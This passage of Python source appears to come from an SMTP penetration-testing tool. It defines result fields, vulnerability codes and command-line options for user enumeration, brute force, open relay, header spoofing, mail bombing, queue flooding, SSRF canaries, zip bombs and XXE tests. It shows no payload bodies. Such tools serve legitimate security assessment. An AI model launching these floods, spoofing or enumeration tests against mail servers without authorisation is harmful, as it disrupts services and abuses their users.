    spf_requires_domain: bool = False  # True when SPF requested but target is IP
    creds: set[Creds] | None = None
    enum_results: list[EnumResult] | None = None
    enum_error: str | None = None  # When run-all enumeration fails (e.g. timeout)
    info: InfoResult | None = None
    info_error: str | None = None  # When run-all info/connect fails
    banner_requested: bool = False
    commands_requested: bool = False
    authentications_requested: bool = False
    max_connections: MaxConnectionsResult | None = None
    max_connections_error: str | None = None  # When run-all max connections test fails
    ntlm: NTLMResult | None = None
    ntlm_error: str | None = None  # When run-all NTLM test fails
    open_relay: bool | None = None
    open_relay_error: str | None = None  # When run-all open relay test fails
    blacklist_error: str | None = None  # When run-all blacklist test fails
    encryption: EncryptionResult | None = None
    encryption_error: str | None = None  # When encryption test fails
    catch_all: CatchAllResult | None = None  # "configured" | "not_configured" | "indeterminate"
    rcpt_limit: RcptLimitResult | None = None
    rcpt_limit_error: str | None = None
    role: RoleResult | None = None
    role_error: str | None = None  # When role identification test fails
    auth_enum: AuthEnumResult | None = None
    auth_enum_error: str | None = None
    auth_format: AuthFormatProbeResult | None = None
    auth_format_error: str | None = None
    helo_validation: HeloValidationResult | None = None
    helo_validation_error: str | None = None
    auth_downgrade: AuthDowngradeResult | None = None
    auth_downgrade_error: str | None = None
    inv_comm: InvCommResult | None = None
    inv_comm_error: str | None = None
    helo_only: HeloOnlyResult | None = None
    helo_only_error: str | None = None
    helo_bypass: HeloBypassResult | None = None
    helo_bypass_error: str | None = None
    bounce_replay: BounceReplayResult | None = None
    bounce_replay_error: str | None = None
    mail_bomb: BombResult | None = None
    mail_bomb_error: str | None = None
    antivirus: AntivirusResult | None = None
    antivirus_error: str | None = None
    ssrf: SsrfResult | None = None
    ssrf_error: str | None = None
    zipxxe: ZipxxeResult | None = None
    zipxxe_error: str | None = None
    flood: FloodResult | None = None
    flood_error: str | None = None
    spoof_header: SpoofHeaderResult | None = None
    spoof_header_error: str | None = None
    bcc_test: BccTestResult | None = None
    bcc_test_error: str | None = None
    alias_test: AliasTestResult | None = None
    alias_test_error: str | None = None
    identify: "ServerIdentifyResult | None" = None
    identify_error: str | None = None


class VULNS(Enum):
    """Per-method AUTH codes kept for compatibility; JSON flat output for -A uses AuthMethods only."""
    AuthMethods = "PTV-SVC-SMTP-AUTHMETHODS"
    AuthAnonymous = "PTV-SVC-SMTP-AUTHANONYMOUS"
    AuthCramMd5 = "PTV-SVC-SMTP-AUTHCRAMMD5"
    AuthDigestMd5 = "PTV-SVC-SMTP-AUTHDIGESTMD5"
    AuthGssapi = "PTV-SVC-SMTP-AUTHGSSAPI"
    AuthKerberos = "PTV-SVC-SMTP-AUTHKERBEROS"
    AuthLogin = "PTV-SVC-SMTP-AUTHLOGIN"
    AuthNtlm = "PTV-SVC-SMTP-AUTHNTLM"
    AuthPlain = "PTV-SVC-SMTP-AUTHPLAIN"
    Banner = "PTV-SVC-BANNER"
    BigSize = "PTV-SVC-SMTP-BIGSIZE"
    Blacklist = "PTV-SVC-SMTP-BLACK"
    CmdATRN = "PTV-SVC-SMTP-COMMATRN"
    CmdDEBUG = "PTV-SVC-SMTP-COMMDEBUG"
    CmdETRN = "PTV-SVC-SMTP-COMMETRN"
    CmdEXPN = "PTV-SVC-SMTP-COMMEXPN"
    CmdSAML = "PTV-SVC-SMTP-COMMSAML"
    CmdSEND = "PTV-SVC-SMTP-COMMSEND"
    CmdSOML = "PTV-SVC-SMTP-COMMSOML"
    CmdTURN = "PTV-SVC-SMTP-COMMTURN"
    CmdVERB = "PTV-SVC-SMTP-COMMVERB"
    CmdVRFY = "PTV-SVC-SMTP-COMMVRFY"
    CryptOnly = "PTV-SVC-CRYPTONLY"
    HybridRole = "PTV-SMTP-HYBRIDROLE"
    ManyRcpt = "PTV-SVC-SMTP-MANYRCPT"
    NoSessionLimit = "PTV-SVC-SMTP-NOSESSIONLIMIT"
    NoStarttls = "PTV-SVC-SMTP-NOSTARTTLS"
    NTLM = "PTV-SVC-NTLMINFO"
    OpenRelay = "PTV-SVC-SMTP-RELAY"
    UserEnumAUTH = "PTV-SVC-SMTP-USRENUMAUTH"
    UserEnumEXPN = "PTV-SVC-SMTP-USRENUMEXPN"
    UserEnumVRFY = "PTV-SVC-SMTP-USRENUMVRFY"
    UserEnumRCPT = "PTV-SVC-SMTP-USRENUMRCPT"
    WeakCreds = "PTV-GENERAL-WEAKCREDENTIALS"
    HeloNoValidation = "PTV-SVC-SMTP-HELONOVAL"
    AuthDowngrade = "PTV-SVC-SMTP-DOWN"
    InvComm = "PTV-SVC-SMTP-INVCOMM"
    HeloOnly = "PTL-SVC-SMTP-HELOONLY"
    HeloBypass = "PTL-SVC-SMTP-HELO"
    BounceReplay = "PTL-SVC-SMTP-REPLAY"
    Bomb = "PTL-SVC-SMTP-BOMB"
    Antivirus = "PTL-SVC-SMTP-ANTIVIRUS"
    Ssrf = "PTL-SVC-SMTP-SSRF"
    Zipxxe = "PTL-SVC-SMTP-ZIPXXE"
    Flood = "PTL-SVC-SMTP-FLOOD"
    SpoofHeader = "PTL-SVC-SMTP-SPOOFHDR"
    BccTest = "PTL-SVC-SMTP-BCC"
    AliasBypass = "PTL-SVC-SMTP-ALIAS"


# endregion

# region arguments


class SMTPArgs(ArgsWithBruteforce):
    target: Target
    tls: bool
    starttls: bool
    ntlm: bool
    mail_from: str | None
    rcpt_to: str | None
    wordlist: str | None
    fqdn: str | None
    enumerate: list[str] | str | None
    blacklist_test: bool
    max_connections: bool
    slow_down: bool
    spf_test: bool
    open_relay: bool
    interactive: bool
    isencrypt: bool
    role: bool

    @staticmethod
    def get_help():
        return [
            {"description": ["SMTP Testing Module"]},
            {"usage": ["ptsrvtester smtp <options> <target>"]},
            {"usage_example": [
                "ptsrvtester smtp -e ALL -sd -w wordlist.txt mail.example.com:25",
                "ptsrvtester smtp -b -c --ntlm 127.0.0.1",
                "ptsrvtester smtp -id mail.example.com:25",
                "ptsrvtester smtp -id --id-aggressive smtp.example.com:25",
                "ptsrvtester smtp -br -m attacker@example.com -r foo@foo.com smtp.example.com:25",
                "ptsrvtester smtp -bomb -r victim@example.com smtp.example.com:587",
                "ptsrvtester smtp -av -r victim@example.com smtp.example.com:587",
                "ptsrvtester smtp -bomb -av -r victim@example.com smtp.example.com:25",
                "ptsrvtester smtp -ssrf -r victim@example.com --ssrf-canary-url https://xyz.oast.fun/ssrf smtp.example.com:587",
                "ptsrvtester smtp -flood -r victim@example.com smtp.example.com:587",
                "ptsrvtester smtp -bomb -flood -r victim@example.com smtp.example.com:25",
                "ptsrvtester smtp -sh -r victim@example.com smtp.example.com:25",
                "ptsrvtester smtp -sh -r victim@example.com -u user -p pass smtp.example.com:587",
                "ptsrvtester smtp -bcc -r to@example.com --cc cc@example.com --bcc bcc@example.com smtp.example.com:25"
            ]},
            {"options": [
                ["-b", "--banner", "", "Grab banner + Service Identification (product, version, CPE)"],
                ["-id", "--identify", "", "Identify SMTP server software from typical responses"],
                ["", "--id-aggressive", "", "Use VRFY/EXPN and RFC-edge probing for enhanced fingerprinting; may trigger WAF/IDS"],
                ["-c", "--commands", "", "Grab EHLO (alias for -A, different JSON)"],
                ["-A", "--authentications", "", "Grab EHLO (alias for -c, different JSON)"],
                ["-af", "--auth-format", "", "AUTH LOGIN identity shape probe (username vs e-mail vs NetBIOS)"],
                ["-ae", "--auth-enum", "", "Test AUTH user enumeration (requires -u or -w)"],
                ["-ad", "--auth-downgrade", "", "Test AUTH downgrade after failed authentication"],
                ["-he", "--helo-validation", "", "Test HELO/EHLO hostname validation"],
                ["-iv", "--invalid-commands", "", "Test invalid/non-standard SMTP commands"],
                ["-ho", "--helo-only", "", "Test if server supports only HELO without EHLO extensions"],
                ["-hb", "--helo-bypass", "", "Test HELO/EHLO value for bypassing security restrictions"],
                ["-m", "--mail-from", "<email>", "Sender address (MAIL FROM); used by -bomb, -av, -sh, -al, -br"],
                ["-r", "--rcpt-to", "<email>", "Recipient (To); required for -bomb, -av, -ssrf, -zipxxe, -sh, -bcc, -al, -br; recommended for -flood"],
                ["-fn", "--from-name", "<name>", "Sender display name in From header; used by -bomb, -av, -ssrf, -zipxxe (no validation)"],
                ["-cc", "--cc", "<emails>", "CC recipients, comma-separated; used by -bomb, -av, -ssrf; required for -bcc (no validation)"],
                ["-sh", "--spoof-headers", "", "Test header spoofing (From, Reply-To, Return-Path); -r recipient (required); -m envelope (MAIL FROM); -u/-p for port 587"],
                ["", "--spoofhdr-variants", "<v1,v2,...>", "Variants: from,reply_to,return_path (default: all); -r recipient, -m envelope"],
                ["", "--spoofhdr-timeout", "<sec>", "Timeout per message for Spoof headers test (default: 30)"],
                ["-bcc", "--bcc-test", "", "BCC disclosure test; -r, --cc, --bcc required; -m envelope; -u/-p for port 587"],
                ["", "--bcc", "<emails>", "BCC recipients, comma-separated; required for -bcc test"],
                ["", "--bcc-timeout", "<sec>", "Timeout for Bcc test (default: 30)"],
                ["-al", "--alias-test", "", "Alias & addressing bypass; -r required; -m envelope; -u/-p for port 587"],
                ["", "--alias-variants", "<v1,v2,...>", "Variants: case,case_domain,dotted,plus,percent,bang_simple,bang_nested (default: all)"],
                ["", "--alias-timeout", "<sec>", "Timeout per variant for Alias test (default: 30)"],
                ["-ie", "--is-encrypt", "", "Check encryption methods"],
                ["", "--ntlm", "", "Inspect NTLM authentication"],
                ["-e", "--enumerate", "[VRFY/EXPN/RCPT/ALL]", "User enumeration (default: ALL)"],
                ["-w", "--wordlist", "<wordlist>", "Usernames for enumeration"],
                ["-t", "--threads", "<threads>", "Threads for enumeration (default: 1)"],
                ["-sd", "--slow-down", "", "Test slow-down protection (requires -e)"],
                ["-mc", "--max-connections", "", "Max connections test"],
                ["-rl", "--recipient-limit", "", "Test RCPT TO recipient limit per message"],
                ["-d", "--domain", "<domain>", "Recipient domain for RCPT TO limit test"],
                ["-or", "--open-relay", "", "Test open relay"],
                ["-ri", "--role-identify", "", "Identify server role (MTA / Submission / Hybrid)"],
                ["-I", "--interactive", "", "Interactive SMTP CLI"],
                ["-bl", "--blacklist-test", "", "Test against blacklists"],
                ["-s", "--spf-test", "", "Test SPF records (requires domain name)"],
                ["-f", "--fqdn", "<fqdn>", "FQDN for EHLO/HELO (default: from target or system hostname)"],
                ["", "--tls", "", "Use implicit SSL/TLS"],
                ["", "--starttls", "", "Use explicit SSL/TLS"],
                ["-u", "--user", "<username>", "Single username for bruteforce"],
                ["-U", "--users", "<wordlist>", "File with usernames"],
                ["-p", "--password", "<password>", "Single password for bruteforce"],
                ["-P", "--passwords", "<wordlist>", "File with passwords"],
                ["-br", "--bounce-replay", "", "Bounce/backscatter test; requires -m (controlled MAIL FROM) and -r (RCPT TO); two probes: MAIL FROM + DATA, then Return-Path in DATA"],
                ["-bomb", "--bomb", "", "Test mail flooding / rate limiting"],
                ["", "--bomb-count", "<n>", "Number of messages to send (default: 100)"],
                ["", "--bomb-timeout", "<sec>", "Max time for entire test (default: 60)"],
                ["", "--bomb-delay", "<sec>", "Delay between messages (default: 0)"],
                ["", "--bomb-threads", "<n>", "Parallel threads for flooding (default: 1)"],
                ["", "--bomb-randomize", "", "Add unique ID to each message (bypass duplicate detection)"],
                ["-av", "--antivirus", "", "Test antivirus/antispam protection; requires -r"],
                ["", "--antivirus-categories", "<cat1,cat2,...>", "Categories: eicar,double_ext,executable,nested_archive,encoded_content,html_sanitization,xxe,mime_malformed (default: all except zip_bomb)"],
                ["", "--antivirus-zip-bomb", "", "Include zip_bomb category (DoS risk!)"],
                ["", "--antivirus-timeout", "<sec>", "Timeout per message for antivirus test (default: 30)"],
                ["", "--antivirus-skip-absent", "", "Skip categories with no definition files"],
                ["-ssrf", "--ssrf", "", "Test SSRF – server fetches links; requires -r and --ssrf-canary-url"],
                ["", "--ssrf-canary-url", "<URL>", "Canary URL for SSRF test (Interactsh, ngrok, etc.)"],
                ["", "--ssrf-variants", "<v1,v2,...>", "SSRF variants: plain,html_link,html_img,html_iframe,multipart,ssrf_malformed,ssrf_nested (default: all)"],
                ["", "--ssrf-internal-urls", "", "Also test internal URLs (127.0.0.1, localhost)"],
                ["", "--ssrf-timeout", "<sec>", "Timeout per message for SSRF test (default: 30)"],
                ["-flood", "--flood", "", "Test queue flood – SIZE extension, queue overload"],
                ["", "--flood-count", "<n>", "Messages for queue stress (default: 150, max 500)"],
                ["", "--flood-timeout", "<sec>", "Max time for queue stress (default: 90)"],
                ["", "--flood-skip-size-test", "", "Skip MAIL FROM SIZE=oversized test"],
                ["-zipxxe", "--zipxxe", "", "Test Zip Bomb, Billion Laughs, XXE; requires -r"],
                ["", "--zipxxe-canary-url", "<URL>", "Canary URL for XXE variants (xxe_zip, xxe_docx; Interactsh, ngrok, etc.)"],
                ["", "--zipxxe-variants", "<v1,v2,...>", "Variants: billion_laughs_attach,billion_laughs_body,xxe_zip,xxe_docx,xxe_body (default: all); zip_bomb/zip_bomb_full via flags"],
                ["", "--zipxxe-zip-bomb", "", "Include zip_bomb variant (minimal ~200KB; DoS risk!)"],
                ["", "--zipxxe-zip-bomb-full", "", "Include zip_bomb_full (~100KB→~100MB; extreme DoS risk!)"],
                ["", "--zipxxe-timeout", "<sec>", "SMTP timeout per message (default: 30)"],
                ["-h", "--help", "", "Show this help message and exit"],
                ["-vv", "--verbose", "", "Enable verbose mode"],
            ]}
        ]

    def add_subparser(self, name: str, subparsers) -> None:
        examples = """example usage:
  ptsrvtester smtp -h
  ptsrvtester smtp -e ALL -sd -w wordlist.txt mail.example.com:25
  ptsrvtester smtp -br -m attacker@example.com -r foo@foo.com smtp.example.com:25
  ptsrvtester smtp -bomb -r victim@example.com smtp.example.com:587
  ptsrvtester smtp -av -r victim@example.com smtp.example.com:587
  ptsrvtester smtp -ssrf -r victim@example.com --ssrf-canary-url https://xyz.oast.fun/ssrf smtp.example.com:587
  ptsrvtester smtp -flood -r victim@example.com smtp.example.com:587
  ptsrvtester smtp -bomb -av -ssrf -flood -zipxxe -r victim@example.com --ssrf-canary-url http://cb --zipxxe-canary-url http://cb smtp.example.com:25
  ptsrvtester smtp -sh -r victim@example.com smtp.example.com:25
  ptsrvtester smtp -sh -r victim@example.com -u user -p pass smtp.example.com:587
  ptsrvtester smtp -bcc -r to@example.com --cc cc@example.com --bcc bcc@example.com smtp.example.com:25
  ptsrvtester smtp -al -r admin@example.com smtp.example.com:25"""

        parser = subparsers.add_parser(
            name,
            epilog=examples,
            add_help=True,
            formatter_class=argparse.RawTextHelpFormatter,
        )

        if not isinstance(parser, argparse.ArgumentParser):
            raise TypeError  # IDE typing

        parser.add_argument(
            "target",
            type=valid_target_smtp,
            help="IP[:PORT] or HOST[:PORT] (e.g. 127.0.0.1 or localhost:25)",
        )

        parser.add_argument("--tls", action="store_true", help="use implicit SSL/TLS")
        parser.add_argument("--starttls", action="store_true", help="use explicit SSL/TLS")
        parser.add_argument("-f", "--fqdn", type=str, metavar="fqdn", help="FQDN for EHLO/HELO (default: from target or system hostname)")

        indirect = parser.add_argument_group(
            "INDIRECT SCANNING",
            "Operations that do NOT communicate directly with the target server",
        )
        indirect.add_argument(
            "-bl", "--blacklist-test", action="store_true", help="Test target against blacklists"
        )
        indirect.add_argument("-s", "--spf-test", action="store_true", help="Test SPF records (requires domain name)")

        direct = parser.add_argument_group(
            "DIRECT SCANNING", "Operations that communicate directly with the target server"
        )
        direct.add_argument("-b", "--banner", action="store_true", help="Grab banner + Service Identification (product, version, CPE)")
        direct.add_argument(
            "-id",
            "--identify",
            action="store_true",
            dest="identify",
            help="Identify SMTP server software from typical responses",
        )
        direct.add_argument(
            "--id-aggressive",
            action="store_true",
            dest="id_aggressive",
            help="Use VRFY/EXPN and RFC-edge probing for enhanced fingerprinting; may trigger WAF/IDS",
        )
        direct.add_argument(
            "-c",
            "--commands",
            action="store_true",
            help="Grab EHLO (alias for -A, different JSON)",
        )
        direct.add_argument(
            "-A",
            "--authentications",
            action="store_true",
            dest="authentications",
            help="Grab EHLO (alias for -c, different JSON)",
        )
        direct.add_argument(
            "-af",
            "--auth-format",
            action="store_true",
            dest="auth_format",
            help="Probe AUTH LOGIN expected identity format; passive multi-connection sondy",
        )
        direct.add_argument("-ae", "--auth-enum", action="store_true", help="Test AUTH user enumeration via LOGIN/NTLM (requires -u or -w)")
        direct.add_argument(
            "-ad",
            "--auth-downgrade",
            action="store_true",
            dest="auth_downgrade",
            help="Test AUTH downgrade after failed authentication",
        )
        direct.add_argument(
            "-he",
            "--helo-validation",
            action="store_true",
            dest="helo_validation",
            help="Test HELO/EHLO hostname validation",
        )
        direct.add_argument(
            "-iv",
            "--invalid-commands",
            action="store_true",
            dest="invalid_commands",
            help="Test invalid/non-standard SMTP commands",
        )
        direct.add_argument(
            "-ho",
            "--helo-only",
            action="store_true",
            dest="helo_only",
            help="Test if server supports only HELO without EHLO extensions (PTL-SVC-SMTP-HELOONLY)",
        )
        direct.add_argument(
            "-hb",
            "--helo-bypass",
            action="store_true",
            dest="helo_bypass",
            help="Test HELO/EHLO value for bypassing security restrictions (PTL-SVC-SMTP-HELO)",
        )
        direct.add_argument(
            "-m", "--mail-from", type=str,
            help="Sender address (MAIL FROM); used by -bomb, -av, -br (default: bombtest/avtest@{fqdn} when not set)",
        )
        direct.add_argument(
            "-r", "--rcpt-to", type=str,
            help="Recipient address (RCPT TO); required for -bomb, -av, -ssrf, -zipxxe, -sh, -br",
        )
        direct.add_argument(
            "-fn",
            "--from-name",
            type=str,
            metavar="name",
            dest="from_name",
            default=None,
            help="Sender display name in From header; used by -bomb, -av, -ssrf, -zipxxe (no validation)",
        )
        direct.add_argument(
            "-cc",
            "--cc",
            type=str,
            metavar="emails",
            dest="cc",
            default=None,
            help="CC recipients, comma-separated; used by -bomb, -av, -ssrf; required for -bcc (no validation)",
        )
        direct.add_argument(
            "-br",
            "--bounce-replay",
            action="store_true",
            dest="bounce_replay",
            help="Bounce/backscatter test; requires -m (controlled MAIL FROM) and -r (RCPT TO); two probes on one connection",
        )
        direct.add_argument(
            "-sh",
            "--spoof-headers",
            action="store_true",
            dest="spoof_headers",
            help="Test header spoofing (From, Reply-To, Return-Path); -r recipient (required); -m envelope (MAIL FROM); -u/-p for port 587",
        )
        direct.add_argument(
            "--spoofhdr-variants",
            type=str,
            metavar="v1,v2,...",
            dest="spoofhdr_variants",
            default=None,
            help="Spoof headers variants: from,reply_to,return_path (default: all); -r recipient, -m envelope (MAIL FROM)",
        )
        direct.add_argument(
            "--spoofhdr-timeout",
            type=float,
            default=30.0,
            metavar="sec",
            dest="spoofhdr_timeout",
            help="Timeout per message for Spoof headers test (default: 30)",
        )
        direct.add_argument(
            "--bcc",
            type=str,
            metavar="emails",
            dest="bcc",
            default=None,
            help="BCC recipients, comma-separated; required for -bcc test (no validation)",
        )
        direct.add_argument(
            "-bcc",
            "--bcc-test",
            action="store_true",
            dest="bcc_test",
            help="BCC disclosure test; -r, --cc, --bcc required; -m envelope; -u/-p for port 587",
        )
        direct.add_argument(
            "--bcc-timeout",
            type=float,
            default=30.0,
            metavar="sec",
            dest="bcc_timeout",
            help="Timeout for Bcc test (default: 30)",
        )
        direct.add_argument(
            "-al",
            "--alias-test",
            action="store_true",
            dest="alias_test",
            help="Alias & addressing bypass; -r required; -m envelope; -u/-p for port 587",
        )
        direct.add_argument(
            "--alias-variants",
            type=str,
            metavar="v1,v2,...",
            dest="alias_variants",
            default=None,
            help="Alias variants: case,dotted,plus,percent,bang_simple,bang_nested (default: all)",
        )
        direct.add_argument(
            "--alias-timeout",
            type=float,
            default=30.0,
            metavar="sec",
            dest="alias_timeout",
            help="Timeout per variant for Alias test (default: 30)",
        )
        direct.add_argument(
            "-ie",
            "--is-encrypt",
            action="store_true",
            dest="isencrypt",
            help="Check encryption methods",
        )
        direct.add_argument("--ntlm", action="store_true", help="inspect NTLM authentication")
        direct.add_argument("-w", "--wordlist", type=str, help="Usernames for enumeration")
        direct.add_argument(
            "-t",
            "--threads",
            type=int,
            default=1,
            metavar="threads",
            dest="enum_threads",
            help="Threads for enumeration (default: 1)",
        )
        direct.add_argument(
            "-e",
            "--enumerate",
            type=str,
            choices=["VRFY", "EXPN", "RCPT", "ALL"],
            nargs="?",
            const="ALL",
            default=None,
            help="User enumeration [VRFY/EXPN/RCPT/ALL] (default: ALL)",
        )
        direct.add_argument(
            "-sd",
            "--slow-down",
            action="store_true",
            help="Test against slow-down protection during enumeration (requires -e)",
        )
        direct.add_argument(
            "-mc", "--max-connections", action="store_true", help="Max connections test"
        )
        direct.add_argument(
            "-rl", "--recipient-limit",
            action="store_true",
            dest="rcpt_limit",
            help="Test RCPT TO recipient limit per message",
        )
        direct.add_argument(
            "-d", "--domain",
            type=str,
            metavar="domain",
            default=None,
            help="Recipient domain for RCPT TO limit test (default: from server banner/EHLO)",
        )
        direct.add_argument("-or", "--open-relay", action="store_true", help="Test Open relay")
        direct.add_argument(
            "-ri",
            "--role-identify",
            action="store_true",
            dest="role",
            help="Identify server role (MTA / Submission / Hybrid)",
        )
        direct.add_argument(
            "-I", "--interactive", action="store_true", help="Establish interactive SMTP CLI"
        )

        add_bruteforce_args(parser)

        stress = parser.add_argument_group(
            "BOMB / ANTIVIRUS / SSRF / FLOOD / ZIPXXE",
            "Stress and content tests; combine flags (order: BOMB → ANTIVIRUS → SSRF → FLOOD → ZIPXXE)",
        )
        stress.add_argument(
            "-bomb",
            "--bomb",
            action="store_true",
            dest="bomb",
            help="Test mail flooding / rate limiting; requires -r",
        )
        stress.add_argument(
            "--bomb-count",
            type=int,
            default=100,
            metavar="n",
            dest="bomb_count",
            help="Number of messages to send (default: 100)",
        )
        stress.add_argument(
            "--bomb-timeout",
            type=float,
            default=60.0,
            metavar="sec",
            dest="bomb_timeout",
            help="Max time for entire BOMB test in seconds (default: 60)",
        )
        stress.add_argument(
            "--bomb-delay",
            type=float,
            default=0.0,
            metavar="sec",
            dest="bomb_delay",
            help="Delay between messages in seconds (default: 0)",
        )
        stress.add_argument(
            "--bomb-threads",
            type=int,
            default=1,
            metavar="n",
            dest="bomb_threads",
            help="Parallel threads for flooding (default: 1)",
        )
        stress.add_argument(
            "--bomb-randomize",
            action="store_true",
            dest="bomb_randomize",
            help="Add unique ID to each message (bypass antispam duplicate detection)",
        )
        stress.add_argument(
            "-av",
            "--antivirus",
            action="store_true",
            dest="antivirus",
            help="Test antivirus/antispam protection; requires -r",
        )
        stress.add_argument(
            "--antivirus-categories",
            type=str,
            metavar="cat1,cat2,...",
            dest="antivirus_categories",
            default=None,
            help="Comma-separated categories (default: all except zip_bomb). Available: eicar, double_ext, executable, nested_archive, encoded_content, html_sanitization, xxe, mime_malformed. Use --antivirus-zip-bomb for zip_bomb.",
        )
        stress.add_argument(
            "--antivirus-zip-bomb",
            action="store_true",
            dest="antivirus_zip_bomb",
            help="Include zip_bomb category (DoS risk! Use with caution)",
        )
        stress.add_argument(
            "--antivirus-timeout",
            type=float,
            default=30.0,
            metavar="sec",
            dest="antivirus_timeout",
            help="Timeout per message for antivirus test in seconds (default: 30)",
        )
        stress.add_argument(
            "--antivirus-skip-absent",
            action="store_true",
            dest="antivirus_skip_absent",
            help="Skip categories that have no definition files",
        )
        stress.add_argument(
            "-ssrf",
            "--ssrf",
            action="store_true",
            dest="ssrf",
            help="Test SSRF – server fetches links; requires -r and --ssrf-canary-url",
        )
        stress.add_argument(
            "--ssrf-canary-url",
            type=str,
            metavar="URL",
            dest="ssrf_canary_url",
            default=None,
            help="Canary/callback URL to embed in test emails (required for SSRF; use Interactsh, ngrok, Burp Collaborator)",
        )
        stress.add_argument(
            "--ssrf-variants",
            type=str,
            metavar="v1,v2,...",
            dest="ssrf_variants",
            default=None,
            help="SSRF variants: plain, html_link, html_img, html_iframe, multipart, ssrf_malformed, ssrf_nested (default: all)",
        )
        stress.add_argument(
            "--ssrf-internal-urls",
            action="store_true",
            dest="ssrf_internal_urls",
            help="Also send messages with http://127.0.0.1, localhost, 10.0.0.1 (detection on MTA host only)",
        )
        stress.add_argument(
            "--ssrf-timeout",
            type=float,
            default=30.0,
            metavar="sec",
            dest="ssrf_timeout",
            help="Timeout per message for SSRF test (default: 30)",
        )
        stress.add_argument(
            "-flood",
            "--flood",
            action="store_true",
            dest="flood",
            help="Test queue flood – SIZE extension, queue overload. May delay production mail.",
        )
        stress.add_argument(
            "--flood-count",
            type=int,
            default=150,
            metavar="n",
            dest="flood_count",
            help="Messages for queue stress (default: 150, max 500). Stops on 421 (panic).",
        )
        stress.add_argument(
            "--flood-timeout",
            type=float,
            default=90.0,
            metavar="sec",
            dest="flood_timeout",
            help="Max time for queue stress in seconds (default: 90)",
        )
        stress.add_argument(
            "--flood-skip-size-test",
            action="store_true",
            dest="flood_skip_size_test",
            help="Skip MAIL FROM SIZE=oversized test (SIZE_ENFORCEMENT phase)",
        )
        stress.add_argument(
            "-zipxxe",
            "--zipxxe",
            action="store_true",
            dest="zipxxe",
            help="Test Zip Bomb, Billion Laughs, XXE; requires -r",
        )
        stress.add_argument(
            "--zipxxe-canary-url",
            type=str,
            metavar="URL",
            dest="zipxxe_canary_url",
            default=None,
            help="Canary URL for XXE variants (required for xxe_zip, xxe_docx; use Interactsh, ngrok, Burp Collaborator)",
        )
        stress.add_argument(
            "--zipxxe-variants",
            type=str,
            metavar="v1,v2,...",
            dest="zipxxe_variants",
            default=None,
            help="ZIPXXE variants: billion_laughs_attach,billion_laughs_body,xxe_zip,xxe_docx,xxe_body (default: all). Use --zipxxe-canary-url for xxe_*.",
        )
        stress.add_argument(
            "--zipxxe-zip-bomb",
            action="store_true",
            dest="zipxxe_zip_bomb",
            help="Include zip_bomb variant (minimal ~200KB; DoS risk!)",
        )
        stress.add_argument(
            "--zipxxe-zip-bomb-full",
            action="store_true",
            dest="zipxxe_zip_bomb_full",
            help="Include zip_bomb_full variant (~100KB→~100MB expansion; extreme DoS risk!)",
        )
        stress.add_argument(
            "--zipxxe-timeout",
            type=float,
            default=30.0,
            metavar="sec",
            dest="zipxxe_timeout",
            help="Timeout per message for ZIPXXE test (default: 30)",
        )


# endregion

# region main module code


class SMTP(BaseModule):
    @staticmethod
    def module_args():
        return SMTPArgs()

    def __init__(self, args: BaseArgs, ptjsonlib: PtJsonLib):
        if not isinstance(args, SMTPArgs):
            raise argparse.ArgumentError(
                None, f'module "{args.module}" received wrong arguments namespace'
            )

        if args.slow_down and args.enumerate == None:
            raise argparse.ArgumentError(None, "--slow-down requires also --enumerate")

        if getattr(args, "auth_enum", False) and not args.user and not args.wordlist:
            raise argparse.ArgumentError(None, "--auth-enum requires -u or -w (wordlist)")

        bomb_requested = getattr(args, "bomb", False)
        antivirus_requested = getattr(args, "antivirus", False)
        if bomb_requested and (not args.rcpt_to or not str(args.rcpt_to).strip()):
            raise argparse.ArgumentError(None, "-bomb requires -r/--rcpt-to (recipient)")
        if antivirus_requested and (not args.rcpt_to or not str(args.rcpt_to).strip()):
            raise argparse.ArgumentError(None, "-antivirus requires -r/--rcpt-to (recipient)")
        ssrf_requested = getattr(args, "ssrf", False)
        if ssrf_requested:
            if not args.rcpt_to or not str(args.rcpt_to).strip():
                raise argparse.ArgumentError(None, "-ssrf requires -r/--rcpt-to (recipient)")
            canary = getattr(args, "ssrf_canary_url", None) or ""
            if not canary or not str(canary).strip():
                raise argparse.ArgumentError(None, "-ssrf requires --ssrf-canary-url (canary/callback URL)")
        zipxxe_requested = getattr(args, "zipxxe", False)
        if zipxxe_requested:
            if not args.rcpt_to or not str(args.rcpt_to).strip():
                raise argparse.ArgumentError(None, "-zipxxe requires -r/--rcpt-to (recipient)")
        spoof_headers_requested = getattr(args, "spoof_headers", False)
        if spoof_headers_requested and (not args.rcpt_to or not str(args.rcpt_to).strip()):
            raise argparse.ArgumentError(None, "-sh/--spoof-headers requires -r/--rcpt-to (recipient)")
        bcc_test_requested = getattr(args, "bcc_test", False)
        if bcc_test_requested:
            if not args.rcpt_to or not str(args.rcpt_to).strip():
                raise argparse.ArgumentError(None, "-bcc/--bcc-test requires -r/--rcpt-to (To recipient)")
            cc_val = getattr(args, "cc", None) or ""
            bcc_val = getattr(args, "bcc", None) or ""
            if not cc_val.strip():
                raise argparse.ArgumentError(None, "-bcc/--bcc-test requires --cc (Cc recipient)")
            if not bcc_val.strip():
                raise argparse.ArgumentError(None, "-bcc/--bcc-test requires --bcc (Bcc recipient)")
        alias_test_requested = getattr(args, "alias_test", False)
        if alias_test_requested and (not args.rcpt_to or not str(args.rcpt_to).strip()):
            raise argparse.ArgumentError(None, "-al/--alias-test requires -r/--rcpt-to (base recipient)")
        bounce_replay_requested = getattr(args, "bounce_replay", False)
        if bounce_replay_requested:
            if not args.mail_from or not str(args.mail_from).strip():
                raise argparse.ArgumentError(
                    None, "-br/--bounce-replay requires -m/--mail-from (controlled bounce / MAIL FROM address)"
                )
            if not args.rcpt_to or not str(args.rcpt_to).strip():
                raise argparse.ArgumentError(None, "-br/--bounce-replay requires -r/--rcpt-to (recipient)")
        # Canary required only for XXE variants; billion_laughs and zip_bomb work without it
        if zipxxe_requested:
            variants_arg = getattr(args, "zipxxe_variants", None)
            zipxxe_variants = [v.strip().lower() for v in (variants_arg or "billion_laughs_attach,billion_laughs_body,xxe_zip,xxe_docx").split(",") if v.strip()]
            xxe_variants = {"xxe_zip", "xxe_docx", "xxe_body"}
            needs_canary = any(v in xxe_variants for v in zipxxe_variants)
            if needs_canary:
                canary = getattr(args, "zipxxe_canary_url", None) or ""
                if not canary or not str(canary).strip():
                    raise argparse.ArgumentError(None, "-zipxxe with xxe_zip/xxe_docx/xxe_body requires --zipxxe-canary-url (canary/callback URL)")
        # Known tests: BOMB,ANTIVIRUS,SSRF,FLOOD,ZIPXXE=implemented

        if args.interactive and args.json:
            raise argparse.ArgumentError(None, "--interactive cannot be used together with --json")

